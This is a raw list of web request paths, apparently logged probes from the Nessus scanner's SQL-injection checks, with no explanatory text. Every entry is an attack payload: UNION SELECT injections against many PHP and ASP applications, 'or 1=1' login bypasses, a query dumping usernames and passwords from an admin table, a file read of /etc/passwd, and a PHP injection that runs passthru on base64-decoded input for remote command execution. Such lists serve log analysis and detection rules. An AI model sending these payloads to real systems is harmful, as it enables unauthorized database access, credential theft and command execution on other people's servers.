 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331908861,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332009305',null,null,null,null --
-
 /examples/jsp/cal/index.php?id='union/**/select/**/0,0,1645029612,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /mailarticle.php?id='union select 0,0,0,0,0,0,username,password,0,0,0,0,0,0,0,0,0 from cc_admin/*
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 438328228--
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331905170
-
 /cgi-bin/?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,359553433,0,0,0,0,0--
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331909358
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,122468218,0,0,0,0,0--
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332010400,256728797 -- 
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010410',null,null,null,null --
-
 /examples/jsp/cal/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /examples/servlets/servlet/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_h0jv924_]));die;/*
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1607725405,0,0,0,0,0--
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1075239311,2,231042861,4,5,6,7,8,9,0,1,2,3 --
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331908740,1,705379658--
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1332010406,4--&blog=1
-
 /www/delivery/ac.php?bannerid=-1332010390+or+1=1+--+';passthru(base64_decode($_server[http_nessus_crnvjntc]));die;/*
-
 /cacti/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331905213,113095511 -- 
-
 /scripts/event_view.php?eid=34 union select 1183395596
-
 /index.php?categories=1&cat=xx' union/**/  select '1','412675581480','2','comments' /*
-
 /recordings/index.php?id='union/**/select/**/0,0,1161314398,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null --
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1332010406,4--&blog=1
-
 /scripts/www/delivery/ac.php?bannerid=-225+or+1=1
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332009307','5'--
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,2094158887,1430162522,1,1,1,1,1--&blogid=1
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331908738','5'--
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1363072756--
-
 /cacti/mail.php?id='/**/union/**/select/**/1,2,1331909423,4--&blog=1
-
 /scripts/www/delivery/ac.php?bannerid=-14+or+1=1
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919216,539900350 -- 
-
 /examples/jsp/sessions/index.php?op=default&date=200607' union select 1,1927066382,1,1,1,1,1,1,1,1--&blogid=1
-
 /main.php?logout=1' and 1=1 and ''<>'tvd59u9i
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1928587300--
-
 /?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 2125564349--
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1114106,2,907689688,4,5,6,7,8,9,0,1,2,3 --
-
 /examples/jsp/error/index.php?id='union/**/select/**/0,0,173444095,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/servlets/servlet/faq.php?action=&type=view&s=&id=-1' union select 0,184558504,0,0,0,0,0--
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,1260750836,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?op=default&date=200607' union select 1,1423223114,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/servlets/servlet/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_57mxcga2]));die;/*
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332010414,1557267964 -- 
-
 /manager/index.php?id='union/**/select/**/0,0,1318083641,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,003352643884,4,5,6,7,8,9,10,11--
-
 /scripts/www/delivery/ac.php?bannerid=-610+or+1=1
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,830002278,0,0,0,0,0--
-
 /scripts/www/delivery/ac.php?bannerid=-787+or+1=1
-
 /scripts/www/delivery/ac.php?bannerid=-302+or+1=1
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331919146+or+1=1+--+';passthru(base64_decode($_server[http_nessus_oxjf6sek]));die;/*
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null --
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,577347075),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /scripts/event_view.php?eid=34 union select 1982082250
-
 /examples/jsp/sessions/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,129517196,0,0,0,0,0--
-
 /www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_3gocdeon]));die;/*
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1974863202,2,2009798962,4,5,6,7,8,9,0,1,2,3 --
-
 /examples/jsp/error/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /en-us/account/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /examples/jsp/jsp2/jspx/faq.php?action=&type=view&s=&id=-1' union select 0,1938145887,0,0,0,0,0--
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1736489965--
-
 /en-us/account/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /scripts/event_view.php?eid=34 union select 1255940005
-
 /cacti/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331905219','5'--
-
 /examples/jsp/error/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_qshknabc]));die;/*
-
 /scripts/index.php?id='union/**/select/**/0,0,217622241,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /site/' union all select filetoclob('/etc/passwd','server')::html,0 from sysusers where username = user --/.html
-
 /en-us/account/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ifl_y2qb]));die;/*
-
 /scripts/calendar.php?month=' union select 1,1,'1331919195','calendarix_month_sql_injection.nasl',1 #
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1071637599--
-
 /examples/jsp/jsp2/el/mail.php?id='/**/union/**/select/**/1,2,1331904463,4--&blog=1
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331909400,244455451 -- 
-
 /examples/jsp/sessions/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331904438
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,877864692409,4,5,6,7,8,9,10,11--
-
 /examples/jsp/cal/calendar.php?month=' union select 1,1,'1331904432','calendarix_month_sql_injection.nasl',1 #
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,82311197,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?id='union/**/select/**/0,0,1327215788,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /top.php?stuff=2040844887' and 1=1 and ''<>'iocjeefz
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1539349120,0,0,0,0,0--
-
 /examples/jsp/cal/faq.php?action=&type=view&s=&id=-1' union select 0,717118813,0,0,0,0,0--
-
 /examples/jsp/sessions/faq.php?action=&type=view&s=&id=-1' union select 0,2063805552,0,0,0,0,0--
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331919205,1,1,1,1,1,1,1--&blogid=1
-
 /cacti/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,569418189,0,0,0,0,0--
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331923205,1,994516176--
-
 /cgi-bin/admin/utilities_confighelp.asp?helpfield=-1') union select configval as confighelp from storeadmin where configvar='storeversion' or ('1'='2
-
 /phpmyadmin/index.php?id='union/**/select/**/0,0,1005650116,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331905235,4--&blog=1
-
 /en-us/account/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1174127559--
-
 /cacti/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331909400,244455451 -- 
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,077396515632,4,5,6,7,8,9,10,11--
-
 /examples/servlets/servlet/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1068432583,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/checkbox/index.php?op=default&date=200607' union select 1,1975764141,1,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1024298013,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/checkbox/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_inohuydx]));die;/*
-
 /scripts/event_view.php?eid=34 union select 2145271726
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331919201
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331904462,1,1641476209--
-
 /cgi-bin/pcadmin/login.asp?idadmin='' or 1=1--
-
 /scripts/admin/utilities_confighelp.asp?helpfield=-1') union select configval as confighelp from storeadmin where configvar='storeversion' or ('1'='2
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,579479720,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1332010398,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919000,0x3a,576275653),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /scripts/www/delivery/ac.php?bannerid=-1331904183+or+1=1+--+';passthru(base64_decode($_server[http_nessus_tqgsxin5]));die;/*
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 920699051--
-
 /admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1332009302+or+1=1+--+';passthru(base64_decode($_server[http_nessus_zvt2swpn]));die;/*
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332010397,0x3a,1301577513),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /faq.php?cat_id=1' or force_mysql_error='2
-
 /examples/jsp/sessions/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1332010419,4,5
-
 /index.php?id='union/**/select/**/0,0,1037776575,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?id='union/**/select/**/0,0,907033072,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,1409137117,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,261058722,0,0,0,0,0--
-
 /examples/jsp/cal/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /index.php?op=default&date=200607' union select 1,898491611,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/cal/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332008329',null,null,null,null --
-
 /cacti/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332010400','5'--
-
 /index.php?id='union/**/select/**/0,0,2115200900,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/jsp/num/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wpypq2jh]));die;/*
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919216,539900350 -- 
-
 /scripts/www/delivery/ac.php?bannerid=-290+or+1=1
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,1673700990,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331919003,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,199642765,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/jsp2/jspx/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_jugo3scd]));die;/*
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331919214,1014126559 --
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904240','5'--
-
 /examples/jsp/colors/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /examples/jsp/sessions/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /www/delivery/ac.php?bannerid=-1332008323+or+1=1+--+';passthru(base64_decode($_server[http_nessus_tbftd0nk]));die;/*
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,1990709357,1464629176,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331919183',null,null,null,null --
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1630321351,0,0,0,0,0--
-
 /scripts/calendar.php?month=' union select 1,1,'1331922100','calendarix_month_sql_injection.nasl',1 #
-
 /scripts/event_view.php?eid=34 union select 634727808
-
 /scripts/index.php?id='union/**/select/**/0,0,1975243928,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /index.php?op=default&date=200607' union select 1,1520713154,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331919223,1,1246967071--
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1332010390+or+1=1+--+';passthru(base64_decode($_server[http_nessus_yjp44tu3]));die;/*
-
 /modules.php?name=web_links&l_op=viewlinkcomments&lid=2pp'/**/union/**/select/**/'412666083482'/*
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,6982,0,0,0,0,0--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332009307,416096840 -- 
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 603119521--
-
 /scripts/index.php?id='union/**/select/**/0,0,1700684154,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /phpmyadmin/?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /examples/jsp/error/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wjflxwdb]));die;/*
-
 /index.php?op=default&date=200607' union select 1,194160379,1,1,1,1,1,1,1,1--&blogid=1
-
 /en-us/account/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331909407','5'--
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,590047445150,4,5,6,7,8,9,10,11--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919008,1645922045 -- 
-
 /manager/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wk4aztya]));die;/*
-
 /www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_1wubmpss]));die;/*
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 911180970,2,397451365,4,5,6,7,8,9,0,1,2,3 --
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919219','5'--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332010414','5'--
-
 /phpmyadmin/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /scripts/index.php?op=default&date=200607' union select 1,1043097911,1,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,941052546,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,504398662),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /scripts/calendar.php?month=' union select 1,1,'1331922013','calendarix_month_sql_injection.nasl',1 #
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331908881','5'--
-
 /phpmyadmin/index.php?id='union/**/select/**/0,0,999630768,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /phpmyadmin/index.php?op=default&date=200607' union select 1,237660662,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
-
 /index.php?id='union/**/select/**/0,0,559725146,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/servlets/servlet/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,1658544285,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332010397,0x3a,1301577513),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /scripts/index.php?op=default&date=200607' union select 1,1563821747,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/jsp2/el/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_2tgmms8c]));die;/*
-
 /main.php?stuff=1417058040' and 1=1 and ''<>'q1w0j8kz
-
 /recordings/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /cacti/index.php?op=default&date=200607' union select 1,888296880,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,421684559,1012165790,1,1,1,1,1--&blogid=1
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331908887,4--&blog=1
-
 /recordings/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/www/delivery/ac.php?bannerid=-619+or+1=1
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1743271420--
-
 /examples/jsp/colors/index.php?op=default&date=200607' union select 1,1739511784,1,1,1,1,1,1,1,1--&blogid=1
-
 /phpmyadmin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /scripts/index.php?op=default&date=200607' union select 1,684890398,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331908729
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331919012,4--&blog=1
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331908886,1,1435248681--
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,989017141953,4,5,6,7,8,9,10,11--
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null --
-
 /examples/jsp/jsp2/el/index.php?id='union/**/select/**/0,0,1398183016,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1332010419,1,722986200--
-
 /scripts/event_view.php?eid=34 union select 419061143
-
 /scripts/event_view.php?eid=34 union select 1574505941
-
 /mail.php?id='/**/union/**/select/**/1,2,1331908888,4--&blog=1
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,776831339,588291065,1,1,1,1,1--&blogid=1
-
 /protectedpage.php?uid=&#039; or &#039;&#039;=&#039;&amp;pwd=&#039; or &#039;&#039;=&#039;
-
 /examples/jsp/jsp2/el/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_x6yxi3nm]));die;/*
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331904244,4--&blog=1
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,522571337321,4,5,6,7,8,9,10,11--
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332008335','5'--
-
 /examples/jsp/jsp2/el/index.php?op=default&date=200607' union select 1,2111767763,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?op=default&date=200607' union select 1,596298457,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?id='union/**/select/**/0,0,281177442,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331908854,0x3a,1781864537),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /examples/servlets/servlet/index.php?op=default&date=200607' union select 1,856108099,1,1,1,1,1,1,1,1--&blogid=1
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904419',null,null,null,null --
-
 /recordings/calendar.php?month=' union select 1,1,'1331918998','calendarix_month_sql_injection.nasl',1 #
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1332010406,4,5
-
 /scripts/index.php?id='union/**/select/**/0,0,553136338,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919008,1645922045 -- 
-
 /phpmyadmin/www/delivery/ac.php?bannerid=-1331904221+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ucypkczy]));die;/*
-
 /mail.php?id='/**/union/**/select/**/1,2,1331923205,4--&blog=1
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332010414','5'--
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331905219','5'--
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908877,462918967 -- 
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,512612977),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /www/delivery/ac.php?bannerid=-1331908788+or+1=1+--+';passthru(base64_decode($_server[http_nessus_s3jekbai]));die;/*
-
 /scripts/index.php?op=default&date=200607' union select 1,2098983739,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331919224,4--&blog=1
-
 /phpmyadmin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null --
-
 /examples/jsp/cal/index.php?id='union/**/select/**/0,0,1317538123,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,526188729179,4,5,6,7,8,9,10,11--
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331904462,1,1434187354--
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331919011,1,921952561--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /index.php?op=default&date=200607' union select 1,1990910236,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/jsp2/jspx/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904462,4,5
-
 /examples/jsp/checkbox/faq.php?action=&type=view&s=&id=-1' union select 0,337036838,0,0,0,0,0--
-
 /examples/jsp/error/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /phpmyadmin/index.php?op=default&date=200607' union select 1,760917547,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/jsp2/el/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /scripts/index.php?id='union/**/select/**/0,0,1511087781,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /en-us/account/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331905213,113095511 -- 
-
 /scripts/event_view.php?eid=34 union select 1215611548
-
 /examples/jsp/checkbox/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1332008335,4,5
-
 /mail.php?id='/**/union/**/select/**/1,2,1332010419,4--&blog=1
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 289896836--
-
 /www/delivery/ac.php?bannerid=-1331918977+or+1=1+--+';passthru(base64_decode($_server[http_nessus_bjmml9oq]));die;/*
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332009306,0x3a,1514709258),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /examples/jsp/num/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1284503405--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332010400,256728797 -- 
-
 /scripts/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331908730,1,1,1,1,1,1,1--&blogid=1
-
 /phpmyadmin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null --
-
